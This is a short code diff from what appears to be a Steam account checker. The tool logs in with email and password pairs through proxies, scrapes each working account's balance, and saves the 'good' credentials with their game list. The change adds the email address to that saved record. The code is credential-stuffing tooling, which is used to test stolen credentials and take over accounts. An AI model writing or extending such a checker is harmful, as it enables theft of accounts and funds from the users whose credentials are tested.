@@ -88,7 +88,7 @@ def check(email:str,password:str):
                 balance = get("https://store.steampowered.com/account/",cookies={"steamLoginSecure":cookie},proxies=proxy_set,timeout=Checker.timeout).text.split('<div class="accountData price">')[1].split("</div>")[0]
                 if not Checker.cui:
                     log("good",username+":"+password,"Steam")
-                save("Steam","good",Checker.time,username+":"+password+f" | Games: {games} | Balance: {balance}")
+                save("Steam","good",Checker.time,username+":"+password+f" | Games: {games} | Balance: {balance} | Email: {email}")
                 Checker.good += 1
                 Checker.cpm += 1
                 return
